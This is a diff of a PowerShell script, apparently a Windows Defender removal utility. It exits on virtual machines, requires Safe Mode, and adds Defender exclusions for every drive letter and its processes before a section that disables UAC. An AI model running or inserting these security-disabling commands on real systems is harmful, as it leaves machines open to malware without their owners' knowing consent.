@@ -31,14 +31,6 @@ if ($computerModel -like "*virtual*") {
     exit
 }
 
-
-# Adding exception for all drive letters (C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z)
-67..90 | foreach-object{
-    $drive_letters = [char]$_
-    Add-MpPreference -ExclusionPath "$($drive_letters):\" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "$($drive_letters):\*" -ErrorAction SilentlyContinue
-}
-
 Write-Host "Checking if user is booted in Safe Mode." -ForegroundColor Yellow
 $bootupState = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty BootupState).ToLower()
 $check_boot = $false
@@ -50,8 +42,15 @@ if ($bootupState -like "*safe*") {
 else {
     Write-Host "The system is not booted in Safe mode."
     Write-Host ""
-    Write-Host "[!] Please boot in Safe mode and try again." -ForegroundColor Yellow
+    Write-Host "[!] Please boot in Safe mode and try again." -ForegroundColor Red
     exit
+}
+
+# Adding exception for all drive letters (C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z)
+67..90 | foreach-object{
+    $drive_letters = [char]$_
+    Add-MpPreference -ExclusionPath "$($drive_letters):\" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "$($drive_letters):\*" -ErrorAction SilentlyContinue
 }
 
 # Disable UAC
